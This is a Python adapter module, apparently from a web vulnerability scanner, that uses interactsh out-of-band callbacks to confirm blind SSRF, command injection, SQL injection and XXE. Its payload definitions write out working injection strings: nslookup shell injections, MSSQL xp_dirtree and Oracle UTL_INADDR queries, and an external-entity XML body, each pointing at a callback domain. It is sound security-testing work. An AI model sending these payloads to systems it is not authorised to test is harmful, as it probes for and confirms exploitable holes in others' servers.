"""
VortexDAST – adapters/interactsh_adapter.py
────────────────────────────────────────────────────────────────────────────
Adapter for **interactsh** (ProjectDiscovery) — an out-of-band (OAST) listener
that confirms *blind* vulnerabilities by detecting a server-side callback to
an attacker-controlled domain, per the IMPROVEMENTS.md Phase C design.

VortexDAST's own heuristic checks are reflection-based: ``ssrf_check`` only
flags SSRF when the response *echoes* evidence of an internal fetch, and
there is no blind-RCE/blind-SQLi/blind-XXE detector at all (IMPROVEMENTS.md
§5 items 4 and 6). Many real vulnerabilities are blind — the server acts on
the attacker's payload but never reflects anything back. This adapter
confirms four vulnerability classes that way, for the one target URL it's
given (the usual per-adapter scope; see IMPROVEMENTS.md's "known
follow-ups" on full data-chaining):

- **SSRF** — parameter value set to our own URL.
- **OS command injection (RCE)** — parameter value set to a shell
  metacharacter payload invoking ``nslookup`` against our domain.
- **Blind SQL injection** — parameter value set to a DBMS-specific
  out-of-band payload (MSSQL ``xp_dirtree``, Oracle ``UTL_INADDR``) that
  forces a DNS lookup if the query is actually executed.
- **Blind XXE** — a dedicated, parameter-independent probe: the target's
  own URL is POSTed a crafted XML document declaring an external entity
  that points at our domain. A compliant-but-unhardened XML parser resolves
  that entity server-side, confirming it even though nothing is reflected
  back and no query parameter is involved at all.

Mechanism, generalised across the three *parameter-substitution* classes
(SSRF/RCE/SQLi):

1. Start ``interactsh-client``, asking it to generate one unique correlation
   domain **per (probe point, payload) combination** on the target, **plus
   one more for the XXE probe** (``-n <count>``), and write them to a local
   file (``-ps``/``-psf``) — so a later callback can be attributed back to
   the exact probe point *and* vulnerability class that caused it. A probe
   point is a GET query parameter (parsed straight from ``target``'s own
   URL), a POST form field, or a JSON body leaf — the latter two only when
   ``ctx.extra["endpoints"]`` carries a crawled :class:`~core.crawler.CrawledEndpoint`
   for ``target`` with forms/``json_requests`` on it (``scanner.py`` always
   sets this). Form fields and JSON leaves reuse ``core/json_fuzz.py``'s
   ``fuzz_targets_for`` — the exact same leaf-walk/path-segment machinery
   ``sqli_check``/``nosql_check``/``xss_check`` already fuzz with — so this
   adapter needs no parsing logic of its own for either.
2. For each combination, issue one request with that probe point's value
   *replaced outright* by the corresponding payload rendered against its own
   domain (every other parameter/field/leaf left untouched): a GET for a
   query parameter, a POST (form-encoded) for a form field, a POST (JSON)
   for a body leaf. Separately, issue one POST of the rendered XXE document
   to the target itself — unrelated to any probe point.
3. Give the server a short grace period to make any outbound call, then read
   whatever interactions ``interactsh-client`` logged (``-json -o <file>``) —
   a DNS lookup alone already proves the server tried to resolve our domain;
   a completed HTTP request proves it went further.
4. Map each distinct domain that fired into one Finding, attributed to its
   probe point (or, for XXE, a ``<xml body>`` placeholder — there is no
   parameter) and vulnerability class, and tear the client down.

The XXE probe always runs, even against a target with no probe points at
all (it needs none) — the client now starts for *every* target. The
SSRF/RCE/SQLi substitution probes simply have nothing to contribute when
there are none, so only the XXE domain gets requested and probed in that
case.

shortcut: a REST-style path segment (e.g. the ``42`` in ``/users/42``) is
not a probe point here, unlike the leaf-walker's other consumers — an OOB
payload needs to *replace* the segment outright (the same way a query
parameter or JSON leaf does), and ``core/json_fuzz.py``'s path-segment
target only supports *appending* to it (meant for ID-swap/boundary-probe
style fuzzing, not a full-value substitution); upgrade if a real target's
object-reference path segment turns out to matter here. The XXE probe only
tries a bare ``application/xml`` POST of the target's own URL — not a SOAP
envelope, not a multipart/XML part, and not the URL's existing query
parameters re-sent alongside the XML body; upgrade if a real target's XML
endpoint needs a different shape to parse the body at all.

Licence note
------------
interactsh-client is MIT-licensed and invoked as a *separate program*
(subprocess), never imported — see IMPROVEMENTS.md §3.

Safety
------
Probe requests only ever set a parameter's value to our own interactsh
domain — never a path, header or destructive payload — and use the public,
anonymous interactsh server pool (no credentials, no cloud account). As with
every adapter, **only scan targets you are authorised to test**: an SSRF
finding here means the target server itself made an outbound request, which
is observable by the operator of whatever interactsh server was used.
"""

from __future__ import annotations

import json
import logging
import os
import shutil
import subprocess
import tempfile
import time
from typing import Any, Callable, Dict, List, NamedTuple, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests

from core.crawler import CrawledEndpoint
from core.cvss import build_vector
from core.cvss import calculate as cvss_calc
from core.json_fuzz import fuzz_targets_for
from core.orchestrator import ScanContext, ToolAdapter
from modules.base import Confidence, Finding, Severity

logger = logging.getLogger(__name__)

# Same CVSS modeling modules/ssrf_check.py uses for its own top (HIGH) tier:
# network-exploitable, no privileges, confirmed cross-boundary reach into
# whatever network the server can see (Scope: Changed).
_CVSS_VECTOR_SSRF_CONFIRMED = build_vector(
    AV="N", AC="L", PR="N", UI="N", S="C", C="H", I="H", A="N"
)
_CVSS_SCORE_SSRF_CONFIRMED: float = cvss_calc(_CVSS_VECTOR_SSRF_CONFIRMED)  # 9.6
# Blind XXE confirmed via external-entity OOB resolution shares this exact
# vector: the impact actually *proven* by this probe is the XML parser
# making a server-side fetch on our behalf — the same scope-changed
# SSRF-shaped reach, not (yet) confirmed local-file disclosure, which this
# bare-entity payload doesn't attempt to exfiltrate.

# Confirmed blind OS command injection: the server actually ran our
# payload, reaching the underlying host — Scope:Changed, full C/I/A.
# AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H → 10.0 (CRITICAL)
_CVSS_VECTOR_RCE_CONFIRMED = build_vector(
    AV="N", AC="L", PR="N", UI="N", S="C", C="H", I="H", A="H"
)
_CVSS_SCORE_RCE_CONFIRMED: float = cvss_calc(_CVSS_VECTOR_RCE_CONFIRMED)  # 10.0

# Confirmed blind SQLi via OOB DNS exfiltration: the DBMS actually executed
# our injected query (higher confidence than sqli_check's heuristic blind
# detector), full read/write, no availability impact from a DNS lookup alone.
# AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:N → 9.1 (CRITICAL)
_CVSS_VECTOR_SQLI_OOB_CONFIRMED = build_vector(
    AV="N", AC="L", PR="N", UI="N", S="U", C="H", I="H", A="N"
)
_CVSS_SCORE_SQLI_OOB_CONFIRMED: float = cvss_calc(_CVSS_VECTOR_SQLI_OOB_CONFIRMED)  # 9.1


class _ProbeSpec(NamedTuple):
    """One payload family: which vuln class it confirms, how to render it."""

    kind: str
    render: Callable[[str], str]


class _ProbePoint(NamedTuple):
    """
    One place an OOB payload can be injected: a GET query parameter, a POST
    form field, or a JSON body leaf. Generalised so the OOB mechanism (one
    correlation domain per point × payload spec, attribute the callback back)
    doesn't care which kind of point it's dealing with.
    """

    parameter: str
    """Reported as ``Finding.parameter`` — the field/param name, or a JSON
    leaf's ``body:...`` label from ``core.json_fuzz.render_path``."""

    send: Callable[[str], None]
    """Send one request with this point's value replaced by the given
    (already-rendered) payload. Never raises — network errors are logged
    and swallowed, same as every other probe send in this adapter."""


#: Payload per vulnerability class, keyed by the domain interactsh-client
#: generates for that probe. Two RCE variants (statement-separator and
#: command-substitution) cover the two most common shell-injection shapes;
#: ``nslookup`` is used (not curl/wget) because it's present on both Windows
#: and Linux and only needs DNS resolution, not an HTTP client binary.
_PROBE_SPECS: List[_ProbeSpec] = [
    _ProbeSpec("ssrf", lambda d: f"http://{d}/"),
    _ProbeSpec("rce", lambda d: f"; nslookup {d} #"),
    _ProbeSpec("rce", lambda d: f"`nslookup {d}`"),
    _ProbeSpec("sqli_mssql", lambda d: f"';EXEC master..xp_dirtree '\\\\{d}\\test';--"),
    _ProbeSpec(
        "sqli_oracle",
        lambda d: f"' UNION SELECT UTL_INADDR.get_host_address('{d}') FROM dual--",
    ),
]


def _render_xxe_payload(domain: str) -> str:
    """
    A minimal external-entity XML document: ``&xxe;`` forces a compliant
    parser to fetch ``domain`` to resolve it, with no file path or further
    exploitation attempted — this probe only needs to prove the fetch
    happens at all.
    """
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE vortex [<!ENTITY xxe SYSTEM "http://{domain}/">]>'
        "<vortex>&xxe;</vortex>"
    )


#: Finding.parameter placeholder for the XXE probe — it has no query
#: parameter at all, the whole request body is the injection vector.
_XXE_PARAM_LABEL = "<xml body>"

#: Per-vulnerability-class finding content. ``description``/``payload_preview``
#: are ``str.format`` templates filled in with the actual protocol/param/domain.
_VULN_META: Dict[str, Dict[str, Any]] = {
    "ssrf": dict(
        title_label="Blind SSRF",
        severity=Severity.HIGH,
        cvss_vector=_CVSS_VECTOR_SSRF_CONFIRMED,
        cvss_score=_CVSS_SCORE_SSRF_CONFIRMED,
        payload_preview="http://{domain}/",
        description=(
            "The server made an outbound {protocols} request to an "
            "attacker-controlled interactsh domain after parameter '{param}' "
            "was set to a URL pointing at it — confirming blind server-side "
            "request forgery that a reflection-based check cannot see."
        ),
        remediation=(
            "Validate and allow-list any server-side-fetched URL (scheme, "
            "host, no loopback/RFC1918/link-local/metadata addresses); never "
            "let user input choose an outbound destination directly."
        ),
    ),
    "rce": dict(
        title_label="Blind OS command injection",
        severity=Severity.CRITICAL,
        cvss_vector=_CVSS_VECTOR_RCE_CONFIRMED,
        cvss_score=_CVSS_SCORE_RCE_CONFIRMED,
        payload_preview="; nslookup {domain} #",
        description=(
            "The server made an outbound {protocols} request to an "
            "attacker-controlled interactsh domain after parameter '{param}' "
            "was set to a shell command-injection payload invoking "
            "nslookup — confirming blind remote code execution."
        ),
        remediation=(
            "Never pass user input to a shell or exec call; use an argv-list "
            "subprocess API (never shell=True on interpolated input) and "
            "validate against an allow-list of expected values."
        ),
    ),
    "sqli_mssql": dict(
        title_label="Blind SQL injection (MSSQL xp_dirtree)",
        severity=Severity.CRITICAL,
        cvss_vector=_CVSS_VECTOR_SQLI_OOB_CONFIRMED,
        cvss_score=_CVSS_SCORE_SQLI_OOB_CONFIRMED,
        payload_preview="';EXEC master..xp_dirtree '\\\\{domain}\\test';--",
        description=(
            "The database server made an outbound {protocols} request to an "
            "attacker-controlled interactsh domain after parameter '{param}' "
            "was set to a stacked-query xp_dirtree UNC-path payload — "
            "confirming blind SQL injection against a Microsoft SQL Server "
            "backend."
        ),
        remediation=(
            "Use parameterized queries/prepared statements for every SQL "
            "statement that incorporates user input; never build SQL via "
            "string concatenation."
        ),
    ),
    "sqli_oracle": dict(
        title_label="Blind SQL injection (Oracle UTL_INADDR)",
        severity=Severity.CRITICAL,
        cvss_vector=_CVSS_VECTOR_SQLI_OOB_CONFIRMED,
        cvss_score=_CVSS_SCORE_SQLI_OOB_CONFIRMED,
        payload_preview="' UNION SELECT UTL_INADDR.get_host_address('{domain}') FROM dual--",
        description=(
            "The database server made an outbound {protocols} request to an "
            "attacker-controlled interactsh domain after parameter '{param}' "
            "was set to a UNION-based UTL_INADDR.get_host_address payload — "
            "confirming blind SQL injection against an Oracle backend."
        ),
        remediation=(
            "Use parameterized queries/prepared statements for every SQL "
            "statement that incorporates user input; never build SQL via "
            "string concatenation."
        ),
    ),
    "xxe": dict(
        title_label="Blind XXE (XML External Entity)",
        severity=Severity.CRITICAL,
        cvss_vector=_CVSS_VECTOR_SSRF_CONFIRMED,
        cvss_score=_CVSS_SCORE_SSRF_CONFIRMED,
        payload_preview=(
            '<!DOCTYPE vortex [<!ENTITY xxe SYSTEM "http://{domain}/">]>'
            "<vortex>&xxe;</vortex>"
        ),
        description=(
            "POSTing a crafted XML document containing an external-entity "
            "declaration to this endpoint caused an outbound {protocols} "
            "request to an attacker-controlled interactsh domain — "
            "confirming the server's XML parser resolves external "
            "entities, a classic blind XXE vulnerability. This probe only "
            "proves the fetch happens; a parser that resolves external "
            "entities can typically also be used to read local files or "
            "reach internal network services."
        ),
        remediation=(
            "Disable external entity resolution (DTDs) in the XML parser "
            "— e.g. XMLConstants.FEATURE_SECURE_PROCESSING in Java, "
            "libxml2's resolve_entities=False / LIBXML_NONET in Python/"
            "PHP, or the parser's documented 'disallow DOCTYPE' setting."
        ),
    ),
}

#: Hard cap on probe points (query params + form fields + JSON leaves)
#: probed per run — bounds request volume against the target and payload
#: count against the (shared, public) interactsh pool.
_MAX_PROBE_POINTS = 20
#: Hard cap on total probes (probe points × payload specs) per run, for the
#: same reason — with 5 specs, 20 points would mean 100 requests/domains.
_MAX_PROBES = 60
#: How long interactsh-client gets to register and write its payload file.
_STARTUP_TIMEOUT = 15.0
#: Grace period after sending probes, for an async server-side callback to
#: land and get polled/flushed by the client.
_SETTLE_SECONDS = 12.0
#: Per-probe HTTP request timeout — we don't need the target's response, only
#: that the request was delivered, so this stays short.
_PROBE_TIMEOUT = 10.0


class InteractshAdapter(ToolAdapter):
    """Drive interactsh-client to confirm blind SSRF/RCE/SQLi/XXE via OOB callback."""

    name: str = "interactsh"
    binary: str = "interactsh-client"
    description: str = (
        "Out-of-band (OAST) interaction testing via interactsh-client. "
        "Substitutes a unique callback domain + payload into each query "
        "parameter and confirms blind SSRF, OS command injection and SQL "
        "injection (MSSQL/Oracle), plus a dedicated parameter-independent "
        "blind-XXE probe, via a DNS/HTTP callback that reflection-based "
        "checks can't see. Optional external tool."
    )
    #: Startup + probing + settle time, all told.
    default_timeout: float = 90.0
    #: Poll interval interactsh-client uses against the OAST server.
    poll_interval: int = 5

    def __init__(self) -> None:
        self._n: int = 1
        self._payload_file: str = ""
        self._interactions_file: str = ""
        #: unique-id (domain's leading label) → (parameter, vuln kind) it was tried on.
        self._domain_to_combo: Dict[str, Tuple[str, str]] = {}
        #: Stashed by run() so parse() can attach the scanned URL to each Finding.
        self._target: str = ""

    # ── ToolAdapter contract ──────────────────────────────────────────────

    def build_command(self, target: str, ctx: ScanContext) -> List[str]:
        """Argv to launch interactsh-client, writing payloads + interactions to files."""
        return [
            self.binary,
            "-json",
            "-ps",
            "-psf",
            self._payload_file or "interactsh_payload.txt",
            "-o",
            self._interactions_file or "interactsh_interactions.jsonl",
            "-n",
            str(self._n),
            "-pi",
            str(self.poll_interval),
            "-duc",
        ]

    def parse(self, raw_output: str) -> List[Finding]:
        """Group interaction JSONL by originating domain and map each to a Finding."""
        if not raw_output:
            return []

        by_label: Dict[str, List[Dict[str, Any]]] = {}
        for line in raw_output.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                record: Any = json.loads(line)
            except (ValueError, TypeError):
                continue
            if not isinstance(record, dict):
                continue
            label = record.get("unique-id") or record.get("full-id")
            if not label:
                continue
            by_label.setdefault(label, []).append(record)

        findings: List[Finding] = []
        for label, records in by_label.items():
            finding = self._map_interactions(label, records)
            if finding is not None:
                findings.append(finding)
        return findings

    # ── Orchestration entry point (overrides the subprocess-only default) ──

    def run(self, target: str, ctx: ScanContext) -> List[Finding]:
        if not self.is_available():
            return self._fallback(target, ctx)

        self._target = target
        points = self._build_probe_points(target, ctx)
        # Bound total probes (points × payload specs) to _MAX_PROBES, then
        # apply the per-point cap on whatever's left.
        max_points_for_budget = max(1, _MAX_PROBES // len(_PROBE_SPECS))
        points = points[: min(_MAX_PROBE_POINTS, max_points_for_budget)]
        combos: List[Tuple[_ProbePoint, _ProbeSpec]] = [
            (point, spec) for point in points for spec in _PROBE_SPECS
        ]
        # The XXE probe needs no probe point at all, so it always runs — one
        # extra domain slot, independent of `combos`.
        if not combos:
            logger.info(
                "interactsh: '%s' has no query parameters/form fields/JSON "
                "body leaves — only the XXE probe will run.",
                target,
            )

        deadline = time.monotonic() + min(self.default_timeout, ctx.tool_timeout)
        workdir = tempfile.mkdtemp(prefix="vortex-interactsh-")
        self._n = len(combos) + 1
        self._payload_file = os.path.join(workdir, "payloads.txt")
        self._interactions_file = os.path.join(workdir, "interactions.jsonl")

        try:
            try:
                proc = subprocess.Popen(
                    self.build_command(target, ctx),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            except FileNotFoundError:
                return self._fallback(target, ctx)

            try:
                domains = self._wait_for_payloads(deadline)
                if not domains:
                    logger.warning("interactsh-client did not register in time.")
                    return []

                self._domain_to_combo = {}
                for (point, spec), domain in zip(combos, domains):
                    label = domain.split(".", 1)[0]
                    self._domain_to_combo[label] = (point.parameter, spec.kind)
                    point.send(spec.render(domain))

                xxe_domain = domains[len(combos)]
                xxe_label = xxe_domain.split(".", 1)[0]
                self._domain_to_combo[xxe_label] = (_XXE_PARAM_LABEL, "xxe")
                self._send_xxe_probe(target, _render_xxe_payload(xxe_domain))

                time.sleep(max(0.0, min(_SETTLE_SECONDS, deadline - time.monotonic())))

                raw = ""
                if os.path.isfile(self._interactions_file):
                    with open(self._interactions_file, "r") as fh:
                        raw = fh.read()
                return self.parse(raw)
            finally:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
        finally:
            shutil.rmtree(workdir, ignore_errors=True)

    # ── Probe-point discovery ────────────────────────────────────────────

    @classmethod
    def _build_probe_points(cls, target: str, ctx: ScanContext) -> List[_ProbePoint]:
        """
        Every place a probe can be injected at ``target``: its own GET query
        parameters, plus — when the crawl found them — POST form fields and
        JSON body leaves on that exact page.
        """
        points = cls._query_param_points(target)
        for endpoint in ctx.extra.get("endpoints", None) or []:
            if endpoint.url != target:
                continue
            points.extend(cls._form_field_points(endpoint))
            points.extend(cls._json_body_points(endpoint))
        return points

    @staticmethod
    def _extract_params(target: str) -> List[str]:
        """Distinct query-parameter names on ``target``, in order of first appearance."""
        query = urlsplit(target).query
        return list(dict.fromkeys(name for name, _ in parse_qsl(query, keep_blank_values=True)))

    @classmethod
    def _query_param_points(cls, target: str) -> List[_ProbePoint]:
        """One probe point per distinct query parameter on ``target``."""

        def _make_send(param: str) -> Callable[[str], None]:
            return lambda probe_value: cls._send_query_probe(target, param, probe_value)

        return [
            _ProbePoint(parameter=name, send=_make_send(name))
            for name in cls._extract_params(target)
        ]

    @classmethod
    def _form_field_points(cls, endpoint: CrawledEndpoint) -> List[_ProbePoint]:
        """One point per field of every POST form rendered on this page."""
        points: List[_ProbePoint] = []
        for form in endpoint.forms:
            if form.method != "POST" or not form.fields:
                continue
            base_body = {f.name: f.default_value for f in form.fields}

            def _make_send(action_url: str, base: Dict[str, str], field: str) -> Callable[[str], None]:
                return lambda probe_value: cls._send_form_probe(action_url, base, field, probe_value)

            for target_field in form.fields:
                points.append(
                    _ProbePoint(
                        parameter=target_field.name,
                        send=_make_send(form.action_url, base_body, target_field.name),
                    )
                )
        return points

    @classmethod
    def _json_body_points(cls, endpoint: CrawledEndpoint) -> List[_ProbePoint]:
        """One point per scalar leaf of every JSON request captured on this page."""
        points: List[_ProbePoint] = []
        for captured in endpoint.json_requests:
            for fuzz_target in fuzz_targets_for(captured):
                if fuzz_target.kind != "body" or fuzz_target.replace is None:
                    continue
                replace = fuzz_target.replace  # the None check above narrows this for mypy

                def _make_send(do_replace: Callable[[Any], Tuple[str, Any]]) -> Callable[[str], None]:
                    def _send(probe_value: str) -> None:
                        url, body = do_replace(probe_value)
                        InteractshAdapter._send_json_probe(url, body)
                    return _send

                points.append(_ProbePoint(parameter=fuzz_target.label, send=_make_send(replace)))
        return points

    # ── Probe senders ─────────────────────────────────────────────────────

    @staticmethod
    def _send_query_probe(target: str, param: str, probe_value: str) -> None:
        """GET ``target`` with ``param`` set to ``probe_value``, other params untouched."""
        parts = urlsplit(target)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        new_pairs = [(k, probe_value if k == param else v) for k, v in pairs]
        probe_url = urlunsplit(parts._replace(query=urlencode(new_pairs)))
        try:
            requests.get(probe_url, timeout=_PROBE_TIMEOUT)
        except requests.exceptions.RequestException as exc:
            logger.debug("interactsh probe request failed (ignored): %s", exc)

    @staticmethod
    def _send_form_probe(
        action_url: str, base_body: Dict[str, str], field: str, probe_value: str
    ) -> None:
        """POST ``action_url`` with ``field`` set to ``probe_value``, other fields untouched."""
        body = dict(base_body)
        body[field] = probe_value
        try:
            requests.post(action_url, data=body, timeout=_PROBE_TIMEOUT)
        except requests.exceptions.RequestException as exc:
            logger.debug("interactsh form probe request failed (ignored): %s", exc)

    @staticmethod
    def _send_json_probe(url: str, json_body: Any) -> None:
        """POST ``json_body`` (already has the probed leaf replaced) to ``url``."""
        try:
            requests.post(url, json=json_body, timeout=_PROBE_TIMEOUT)
        except requests.exceptions.RequestException as exc:
            logger.debug("interactsh JSON probe request failed (ignored): %s", exc)

    @staticmethod
    def _send_xxe_probe(target: str, xml_body: str) -> None:
        """POST ``xml_body`` straight to ``target`` — no query-param involved."""
        try:
            requests.post(
                target,
                data=xml_body.encode("utf-8"),
                headers={"Content-Type": "application/xml"},
                timeout=_PROBE_TIMEOUT,
            )
        except requests.exceptions.RequestException as exc:
            logger.debug("interactsh XXE probe request failed (ignored): %s", exc)

    def _wait_for_payloads(self, deadline: float) -> List[str]:
        """Poll the payload file until it has one line per requested domain."""
        startup_deadline = min(deadline, time.monotonic() + _STARTUP_TIMEOUT)
        while time.monotonic() < startup_deadline:
            if os.path.isfile(self._payload_file):
                lines = [
                    line.strip()
                    for line in open(self._payload_file).read().splitlines()
                    if line.strip()
                ]
                if len(lines) >= self._n:
                    return lines
            time.sleep(0.3)
        return []

    def _map_interactions(
        self, label: str, records: List[Dict[str, Any]]
    ) -> Optional[Finding]:
        param, kind = self._domain_to_combo.get(label, ("?", "ssrf"))
        meta = _VULN_META[kind]
        protocols: List[str] = sorted(
            {p for r in records if isinstance(p := r.get("protocol"), str)}
        )
        remote_addrs: List[str] = sorted(
            {a for r in records if isinstance(a := r.get("remote-address"), str)}
        )

        # A completed HTTP round trip is stronger evidence than a bare DNS
        # lookup (which some resolvers/proxies can trigger incidentally).
        if "http" in protocols:
            confidence = Confidence.CERTAIN
        else:
            confidence = Confidence.FIRM

        protocols_str = "/".join(protocols)
        description = meta["description"].format(protocols=protocols_str, param=param)

        return Finding(
            title=f"{meta['title_label']} confirmed via OOB callback: parameter '{param}'",
            severity=meta["severity"],
            confidence=confidence,
            url=self._target,
            parameter=param,
            payload=meta["payload_preview"].format(domain=f"{label}..."),
            evidence=f"{len(records)} interaction(s) ({protocols_str}) from {', '.join(remote_addrs)}",
            description=description,
            remediation=meta["remediation"],
            cvss_vector=meta["cvss_vector"],
            cvss_score=meta["cvss_score"],
            extra={
                "tool": self.name,
                "vuln_class": kind,
                "parameter": param,
                "domain_label": label,
                "protocols": protocols,
                "remote_addresses": remote_addrs,
                "interaction_count": len(records),
            },
        )
